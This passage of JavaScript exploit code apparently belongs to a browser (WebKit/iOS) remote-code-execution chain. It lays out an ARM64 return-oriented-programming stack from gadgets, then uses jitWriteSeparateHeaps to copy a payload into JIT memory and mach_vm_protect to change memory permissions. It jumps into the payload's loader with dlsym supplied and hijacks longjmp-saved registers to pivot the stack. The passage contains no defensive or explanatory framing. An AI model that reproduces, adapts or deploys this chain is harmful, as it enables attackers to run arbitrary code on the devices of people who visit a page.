        log(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);
        //x4 = x4 || Int64.One
        // in stackloader:
        arr[pos++] = 0xdead0010;                // unused
        arr[pos++] = 0xdead0011;                // unused
        arr[pos++] = 0xdead0012;                // unused
        arr[pos++] = 0xdead0013;                // unused
        arr[pos++] = 0xdead1101;                // x28 (unused)
        arr[pos++] = 0xdead1102;                // x28 (unused)
        arr[pos++] = 0xdead0014;                // x27 == x6 (unused)
        arr[pos++] = 0xdead0015;                // x27 == x6 (unused)
        arr[pos++] = 0xdead0016;                // x26 (unused)
        arr[pos++] = 0xdead0017;                // x26 (unused)
        arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
        arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
        arr[pos++] = x0.lo();                   // x24 == x0 (arg1)
        arr[pos++] = x0.hi();                   // x24 == x0 (arg1)
        arr[pos++] = x2.lo();                   // x23 == x2 (arg3)
        arr[pos++] = x2.hi();                   // x23 == x2 (arg3)
        arr[pos++] = x3.lo();                   // x22 == x3 (arg4)
        arr[pos++] = x3.hi();                   // x22 == x3 (arg4)
        arr[pos++] = func.lo();                 // x21 (target for dispatch)
        arr[pos++] = func.hi();                 // x21 (target for dispatch)
        arr[pos++] = 0xdead0018;                // x20 (unused)
        arr[pos++] = 0xdead0019;                // x20 (unused)
        var tmppos = pos;
        arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
        arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
        arr[pos++] = 0xdead001c;                // x29 (unused)
        arr[pos++] = 0xdead001d;                // x29 (unused)
        arr[pos++] = ldrx8.lo();                // x30 (next gadget)
        arr[pos++] = ldrx8.hi();                // x30 (next gadget)

        // in ldrx8
        if (x4) {
            arr[pos++] = stackloader.lo();
            arr[pos++] = stackloader.hi();
        } else {
            arr[pos++] = dispatch.lo();             // x8 (target for regloader)
            arr[pos++] = dispatch.hi();             // x8 (target for regloader)
        }
        arr[pos++] = 0xdead1401;                // (unused)
        arr[pos++] = 0xdead1402;                // (unused)
        arr[pos++] = 0xdead1301;                // x20 (unused)
        arr[pos++] = 0xdead1302;                // x20 (unused)
        arr[pos++] = x1.lo();                   // x19 == x1 (arg2)
        arr[pos++] = x1.hi();                   // x19 == x1 (arg2)
        arr[pos++] = 0xdead1201;                // x29 (unused)
        arr[pos++] = 0xdead1202;                // x29 (unused)
        arr[pos++] = regloader.lo();            // x30 (next gadget)
        arr[pos++] = regloader.hi();            // x30 (next gadget)

        // in regloader
        // NOTE: REGLOADER DOES NOT ADJUST SP!
        // sometimes i didn't get expected value in x4
        // and i have no fucking idea why
        // usleep likely did the trick, but I would still keep the code
        // with movx4
        // arr[pos++] = x4.lo()                    // x4 (should be -- but see lines above)
        // arr[pos++] = x4.hi()                    // x4 (should be -- but see lines above)

        if (x4) {
            // in stackloader:
            arr[pos++] = 0xdaad0010;                // unused
            arr[pos++] = 0xdaad0011;                // unused
            arr[pos++] = 0xdaad0012;                // unused
            arr[pos++] = 0xdaad0013;                // unused
            arr[pos++] = 0xdaad1101;                // x28 (unused)
            arr[pos++] = 0xdaad1102;                // x28 (unused)
            arr[pos++] = 0xdaad0014;                // x27 == x6 (unused)
            arr[pos++] = 0xdaad0015;                // x27 == x6 (unused)
            arr[pos++] = 0xdaad0016;                // x26 (unused)
            arr[pos++] = 0xdaad0017;                // x26 (unused)
            arr[pos++] = 0xdaad0018;                // x25 (unused)
            arr[pos++] = 0xdaad0019;                // x25 (unused)
            arr[pos++] = 0xdaad00f0;                // x24 (unused)
            arr[pos++] = 0xdaad00f1;                // x24 (unused)
            arr[pos++] = 0xdaad00f2;                // x23 (unused)
            arr[pos++] = 0xdaad00f3;                // x23 (unused)
            arr[pos++] = 0xdaad00f4;                // x22 (unused)
            arr[pos++] = 0xdaad00f5;                // x22 (unused)
            arr[pos++] = func.lo();                 // x21 (target for dispatch)
            arr[pos++] = func.hi();                 // x21 (target for dispatch)
            arr[pos++] = 0xdaad0018;                // x20 (unused)
            arr[pos++] = 0xdaad0019;                // x20 (unused)
            tmppos = pos;
            arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
            arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
            arr[pos++] = 0xdaad001c;                // x29 (unused)
            arr[pos++] = 0xdaad001d;                // x29 (unused)
            arr[pos++] = ldrx8.lo();                // x30 (next gadget)
            arr[pos++] = ldrx8.hi();                // x30 (next gadget)

            // in ldrx8
            arr[pos++] = dispatch.lo();             // x8 (target for movx4)
            arr[pos++] = dispatch.hi();             // x8 (target for movx4)
            arr[pos++] = 0xdaad1401;                // (unused)
            arr[pos++] = 0xdaad1402;                // (unused)
            arr[pos++] = x4.lo();                   // x20 == x4 (arg5)
            arr[pos++] = x4.hi();                   // x20 == x4 (arg5)
            arr[pos++] = 0xdaad1301;                // x19 (unused)
            arr[pos++] = 0xdaad1302;                // x19 (unused)
            arr[pos++] = 0xdaad1201;                // x29 (unused)
            arr[pos++] = 0xdaad1202;                // x29 (unused)
            arr[pos++] = movx4.lo();                // x30 (next gadget)
            arr[pos++] = movx4.hi();                // x30 (next gadget)
        }

        // after dispatch:

        // keep only one: these or 0xdeaded01
        arr[pos++] = 0xdead0022;                // unused
        arr[pos++] = 0xdead0023;                // unused

        arr[pos++] = 0xdead0022;                // unused
        arr[pos++] = 0xdead0023;                // unused
        arr[pos++] = 0xdead0024;                // x22 (unused)
        arr[pos++] = 0xdead0025;                // x22 (unused)
        arr[pos++] = 0xdead0026;                // x21 (unused)
        arr[pos++] = 0xdead0027;                // x21 (unused)
        arr[pos++] = 0xdead0028;                // x20 (unused)
        arr[pos++] = 0xdead0029;                // x20 (unused)
        arr[pos++] = 0xdead002a;                // x19 (unused)
        arr[pos++] = 0xdead002b;                // x19 (unused)
        arr[pos++] = 0xdead002c;                // x29 (unused)
        arr[pos++] = 0xdead002d;                // x29 (unused)
        arr[pos++] = jump_to.lo();              // x30 (gadget)
        arr[pos++] = jump_to.hi();              // x30 (gadget)
    }

    var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {
        x0 = x0 || Int64.Zero
        x1 = x1 || Int64.Zero
        x2 = x2 || Int64.Zero
        x3 = x3 || Int64.Zero
        jump_to = jump_to || stackloader

        return add_call_via_x8(func, x0, x1, x2, x3, x4, jump_to)
    }

    add_call(new Int64(jitWriteSeparateHeaps)
        , Sub(codeAddr, memPoolStart)     // off
        , paddr                           // src
        , shsz                            // size
    );

    segs.forEach(function(seg) {
        var addr = Add(seg.addr, codeAddr);
        if (seg.prots.hi() & 2) { // VM_PROT_WRITE
            var addr = Add(seg.addr, codeAddr);
            log(`Calling mach_vm_protect, ${mach_vm_protect.toString(16)}, ${mach_task_self_ >>> 0} ${addr} ${seg.size} 0 0x13`);
            add_call(new Int64(mach_vm_protect)
                , new Int64(mach_task_self_ >>> 0)    // task
                , addr                                // addr
                , seg.size                          // size
                , new Int64(0)                      // set maximum
                , new Int64(0x13)                   // prot (RW- | COPY)
            );
        }
    })

    add_call(new Int64(usleep)
        , new Int64(100000) // microseconds
    );

    var jmpAddr = Add(psyms["_load"], shslide);
    add_call(jmpAddr
        , paddr //x0 payload addr
        , dlsym //x1 dlsym
        , memPoolEnd //x2 
        , memPoolStart //x3
        , new Int64(0xcafebabe41414150) //x4
    );

    // dummy
    for(var i = 0; i < 0x20; ++i)
    {
            arr[pos++] = 0xde00c0de + (i<<16);
    }

    //set longjmp's register
    var sp = Add(stack, (arrsz - off) * 4);
    write64(Add(x19, 0x58), new Int64(stackloader));
    write64(Add(x19, 0x60), new Int64(sp));

    wrapper.addEventListener("click", function(){ }); 

    return;
}